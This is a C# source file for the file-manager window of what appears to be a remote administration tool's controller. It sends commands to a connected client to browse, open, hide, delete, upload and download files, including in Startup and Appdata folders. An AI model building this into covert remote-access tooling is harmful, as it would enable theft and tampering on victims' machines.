using PacketLib;
using Server.Forms.UtilsForm;
using Server.Handlers;
using Server.Network;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using static System.Net.WebRequestMethods;
using File = System.IO.File;

namespace Server.Forms
{
    public partial class FileManagerForm : Form
    {
        public _Client _Client { get; set; }

        public FileManagerForm()
        {
            InitializeComponent();
        }

        private void ConnectionCheckup_Tick(object sender, EventArgs e)
        {
            if (_Client == null || !_Client.isConnected())
            {
                this.Close();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(pathTxtbox.Text))
            {
                MsgPack msgPack = new MsgPack();
                msgPack.Set("Packet", "FileManager");
                msgPack.Set("Command", "Drives");
                _Client.Send(msgPack.Pack());
            }
            else
            {
                ChangeDir(pathTxtbox.Text);
            }
        }

        public void ChangeDir(string path)
        {
            if (!String.IsNullOrEmpty(path))
            {
                MsgPack msgPack = new MsgPack();
                msgPack.Set("Packet", "FileManager");
                msgPack.Set("Command", "Cd");
                msgPack.Set("Path", path);
                _Client.Send(msgPack.Pack());
                fileManagerView.Enabled = false;
                fileManagerView.Visible = false;
                waitLbl.Visible = true;
                waitLbl.BringToFront();
                countLbl.Text = "[00]  Files       [00] Folders";
            }
        }
        private void drivesCombo_SelectedIndexChanged(object sender, EventArgs e)
        {
            ChangeDir(drivesCombo.Text);
        }

        private void fileManagerView_DoubleClick(object sender, EventArgs e)
        {
            if (fileManagerView.SelectedItems[0].SubItems[type_ch.Index].Text == "Folder")
            {
                string path = (string)fileManagerView.SelectedItems[0].Tag;
                ChangeDir(path);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string path = pathTxtbox.Text;
            if (path.Length >= 3)
            {
                path = path.Remove(path.LastIndexOfAny(new char[] { '\\' }, path.LastIndexOf('\\')));
                if (!path.Contains(@"\"))
                {
                    path = path + @"\";
                }
                ChangeDir(path);
            }
        }

        private void FilemanagerForm_Load(object sender, EventArgs e)
        {

        }

        private void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem selectedItem in fileManagerView.SelectedItems)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.Set("Packet", "FileManager");
                msgPack.Set("Command", "Open");
                msgPack.Set("Target", (string)selectedItem.Tag);
                _Client.Send(msgPack.Pack());
            }
        }

        private void userProfileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ChangeDir("UserProfile");
        }

        private void desktopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ChangeDir("Desktop");
        }

        private void documentsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ChangeDir("Documents");
        }

        private void downloadsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ChangeDir("Downloads");
        }

        private void musicToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ChangeDir("Music");
        }

        private void pictureToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ChangeDir("Pictures");
        }

        private void videosToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ChangeDir("Videos");
        }

        private void startupToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ChangeDir("Startup");
        }

        private void appdataToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ChangeDir("Appdata");
        }

        private void localAppdataToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ChangeDir("LocalAppdata");
        }

        private void tempToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ChangeDir("Temp");
        }

        private void oneDriveToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ChangeDir("OneDrive");
        }

        private void windowsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ChangeDir("Windows");
        }

        private void renameToolStripMenuItem_Click(object sender, EventArgs e)
        {
            User_InputForm user_Input = new User_InputForm();
            user_Input.inputTxtBox.Text = "Rename_" + Helpers.Random(10);
            if (user_Input.ShowDialog() == DialogResult.OK)
            {
                string inputData = user_Input.inputTxtBox.Text;
                if (String.IsNullOrEmpty(inputData)) return;
                if (fileManagerView.SelectedItems.Count > 1)
                {
                    int x = 1;
                    foreach (ListViewItem selectedItem in fileManagerView.SelectedItems)
                    {
                        MsgPack msgPack = new MsgPack();
                        msgPack.Set("Packet", "FileManager");
                        msgPack.Set("Command", "Rename");
                        msgPack.Set("isFolder", selectedItem.SubItems[type_ch.Index].Text == "Folder");
                        msgPack.Set("Old", (string)selectedItem.Tag);
                        msgPack.Set("New", Path.Combine(pathTxtbox.Text, inputData + "_" + x++));
                        _Client.Send(msgPack.Pack());
                    }
                }
                else
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.Set("Packet", "FileManager");
                    msgPack.Set("Command", "Rename");
                    msgPack.Set("isFolder", fileManagerView.SelectedItems[0].SubItems[type_ch.Index].Text == "Folder");
                    msgPack.Set("Old", (string)fileManagerView.SelectedItems[0].Tag);
                    msgPack.Set("New", Path.Combine(pathTxtbox.Text, inputData));
                    _Client.Send(msgPack.Pack());
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem selectedItem in fileManagerView.SelectedItems)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.Set("Packet", "FileManager");
                msgPack.Set("Command", "Delete");
                msgPack.Set("isFolder", selectedItem.SubItems[type_ch.Index].Text == "Folder");
                msgPack.Set("Target", (string)selectedItem.Tag);
                _Client.Send(msgPack.Pack());
            }
        }

        private void fileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            User_InputForm user_Input = new User_InputForm();
            user_Input.inputTxtBox.Text = "Rename_" + Helpers.Random(10);
            if (user_Input.ShowDialog() == DialogResult.OK)
            {
                string inputData = user_Input.inputTxtBox.Text;
                if (String.IsNullOrEmpty(inputData)) return;
                MsgPack msgPack = new MsgPack();
                msgPack.Set("Packet", "FileManager");
                msgPack.Set("Command", "New");
                msgPack.Set("isFolder", false);
                msgPack.Set("Target", Path.Combine(pathTxtbox.Text, inputData));
                _Client.Send(msgPack.Pack());
            }
        }

        private void folderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            User_InputForm user_Input = new User_InputForm();
            user_Input.inputTxtBox.Text = "Rename_" + Helpers.Random(10);
            if (user_Input.ShowDialog() == DialogResult.OK)
            {
                string inputData = user_Input.inputTxtBox.Text;
                if (String.IsNullOrEmpty(inputData)) return;
                MsgPack msgPack = new MsgPack();
                msgPack.Set("Packet", "FileManager");
                msgPack.Set("Command", "New");
                msgPack.Set("isFolder", true);
                msgPack.Set("Target", Path.Combine(pathTxtbox.Text, inputData));
                _Client.Send(msgPack.Pack());
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (String.IsNullOrEmpty(pathTxtbox.Text))
            {
                MsgPack msgPack = new MsgPack();
                msgPack.Set("Packet", "FileManager");
                msgPack.Set("Command", "Drives");
                _Client.Send(msgPack.Pack());
            }
            else
            {
                ChangeDir(pathTxtbox.Text);
            }
        }

        private void backToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string path = pathTxtbox.Text;
            if (path.Length >= 3)
            {
                path = path.Remove(path.LastIndexOfAny(new char[] { '\\' }, path.LastIndexOf('\\')));
                ChangeDir(path);
            }
        }

        List<string> files = new List<string>();
        List<string> folders = new List<string>();
        private void copyToolStripMenuItem_Click(object sender, EventArgs e)
        {
            files.Clear();
            folders.Clear();
            foreach (ListViewItem selectedItem in fileManagerView.SelectedItems)
            {
                if (selectedItem.SubItems[type_ch.Index].Text == "Folder")
                {
                    folders.Add((string)selectedItem.Tag);
                }
                else
                {
                    files.Add((string)selectedItem.Tag);
                }
            }
        }

        private void pasteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MsgPack msgPack = new MsgPack();
            msgPack.Set("Packet", "FileManager");
            msgPack.Set("Command", "Paste");
            msgPack.Set("Path", pathTxtbox.Text);
            msgPack.Set("Target_Files", files.ToArray());
            msgPack.Set("Target_Folders", folders.ToArray());
            _Client.Send(msgPack.Pack());
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach(ListViewItem selectedItem in fileManagerView.SelectedItems)
            {
                if (selectedItem.SubItems[type_ch.Index].Text == "Folder") continue;

                string Duid = Helpers.Random();
                MsgPack msgPack = new MsgPack();
                msgPack.Set("Packet", "Download");
                msgPack.Set("File", selectedItem.Tag);
                msgPack.Set("DUID", Duid);
               
                DownUp_loadForm downloadForm = (DownUp_loadForm)Application.OpenForms["Download:" + Duid];
                if (downloadForm == null)
                {
                    downloadForm = new DownUp_loadForm
                    {
                        Name = "Download:" + Duid,
                        Text = "Download:" + Duid,
                        _Client = _Client,
                    };
                    downloadForm.Show();
                    _Client.Send(msgPack.Pack());
                }
            }
        }
        public static int OneMb = 1000000;

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Multiselect = true;
            openFileDialog.Filter = "All files (*.*)|*.*";
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                foreach (string file in openFileDialog.FileNames)
                {
                    string fileName = Path.GetFileName(file);
                    string Duid = Helpers.Random();
                    long fileSize = new FileInfo(file).Length;
                    DownUp_loadForm uploadForm = (DownUp_loadForm)Application.OpenForms["Upload:" + Duid];
                    if (uploadForm == null)
                    {
                        uploadForm = new DownUp_loadForm
                        {
                            Name = "Upload:" + Duid,
                            Text = "Upload:" + Duid,
                            _Client = _Client,
                            UID = _Client.uid,
                            FileName = Path.GetFileName(file),
                            FileSize = fileSize
                        };
                        uploadForm.Show();
                        Task.Run(() =>
                        {
                            if (fileSize > 0)
                            {
                                MsgPack msgPack = null;
                                int count = 1;
                                if (fileSize < OneMb)
                                {
                                    msgPack = new MsgPack();
                                    msgPack.Set("Packet", "Upload");
                                    msgPack.Set("isCompleted", false);
                                    msgPack.Set("TempName", Helpers.MD5_STRING(Encoding.UTF8.GetBytes(fileName + Duid + count)));
                                    msgPack.Set("FileBytes", File.ReadAllBytes(file));
                                    _Client.Send(msgPack.Pack());
                                    uploadForm.TotalFileSize += fileSize;
                                }
                                else
                                {
                                    int bytesRead = 0;
                                    long totalSize = fileSize;
                                    byte[] buffer = new byte[OneMb];
                                    using (Stream source = File.OpenRead(file))
                                    {
                                        while (((bytesRead = source.Read(buffer, 0, buffer.Length)) > 0) && _Client.isConnected())
                                        {
                                            msgPack = new MsgPack();
                                            msgPack.Set("Packet", "Upload");
                                            msgPack.Set("isCompleted", false);
                                            msgPack.Set("TempName", Helpers.MD5_STRING(Encoding.UTF8.GetBytes(Path.GetFileName(file) + Duid + (count++).ToString())));
                                            msgPack.Set("FileBytes", buffer);
                                            _Client.Send(msgPack.Pack());
                                            uploadForm.TotalFileSize += buffer.Length;
                                            totalSize -= bytesRead;
                                            if (totalSize < OneMb)
                                                buffer = new byte[totalSize];
                                        }
                                    }
                                }

                                msgPack = new MsgPack();
                                msgPack.Set("Packet", "Upload");
                                msgPack.Set("DUID", Duid);
                                msgPack.Set("isCompleted", true);
                                msgPack.Set("FileName", fileName);
                                msgPack.Set("FileSize", new FileInfo(file).Length);
                                msgPack.Set("FilePath", pathTxtbox.Text);
                                msgPack.Set("TempCount", count);
                                _Client.Send(msgPack.Pack());
                            }
                            Thread.Sleep(800);
                            this.Invoke(new MethodInvoker(() => uploadForm.progressBar1.Value = 100));
                            uploadForm.Update.Stop();
                            uploadForm.Status("Waiting for confirmation from client...");
                        });
                    }
                }
            }
        }

        private void searchFileToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            string path = pathTxtbox.Text;
            User_InputForm user_Input = new User_InputForm();
            user_Input.inputTxtBox.Text = "New*.txt";
            if (user_Input.ShowDialog() == DialogResult.OK)
            {
                string inputData = user_Input.inputTxtBox.Text;
                if (String.IsNullOrEmpty(inputData)) return;
                if (!String.IsNullOrEmpty(path))
                {
                    MsgPack msgPack = new MsgPack();
                    msgPack.Set("Packet", "FileManager");
                    msgPack.Set("Command", "Search");
                    msgPack.Set("Pattern", inputData);
                    msgPack.Set("Path", path);
                    _Client.Send(msgPack.Pack());
                    fileManagerView.Enabled = false;
                    fileManagerView.Visible = false;
                    waitLbl.Visible = true;
                    waitLbl.BringToFront();
                    countLbl.Text = "[00]  Files       [00] Folders";
                }
            }
        }

        private void copyAsPathToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(fileManagerView.SelectedItems[0].Tag as string);
        }

        private void editToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem selectedItem in fileManagerView.SelectedItems)
            {
                if (selectedItem.SubItems[type_ch.Index].Text == "Folder") continue;

                string Euid = Helpers.Random();
                MsgPack msgPack = new MsgPack();
                msgPack.Set("Packet", "FileManager");
                msgPack.Set("Command", "Edit");
                msgPack.Set("Do", "Get");
                msgPack.Set("File", selectedItem.Tag);
                msgPack.Set("EUID", Euid);

                Editor_Form editorForm = (Editor_Form)Application.OpenForms["Editor:" + Euid];
                if (editorForm == null)
                {
                    editorForm = new Editor_Form
                    {
                        Name = "Editor:" + Euid,
                        Text = "Editor:" + Euid,
                        _Client = _Client,
                    };
                    editorForm.Show();
                    _Client.Send(msgPack.Pack());
                }
            }
        }

        private void showToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem selectedItem in fileManagerView.SelectedItems)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.Set("Packet", "FileManager");
                msgPack.Set("Command", "Show");
                msgPack.Set("Target", selectedItem.Tag);
                msgPack.Set("isFolder", selectedItem.SubItems[type_ch.Index].Text == "Folder");
                _Client.Send(msgPack.Pack());
            }
        }

        private void hideToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem selectedItem in fileManagerView.SelectedItems)
            {
                MsgPack msgPack = new MsgPack();
                msgPack.Set("Packet", "FileManager");
                msgPack.Set("Command", "Hide");
                msgPack.Set("Target", selectedItem.Tag);
                msgPack.Set("isFolder", selectedItem.SubItems[type_ch.Index].Text == "Folder");
                _Client.Send(msgPack.Pack());
            }

        }
    }
}
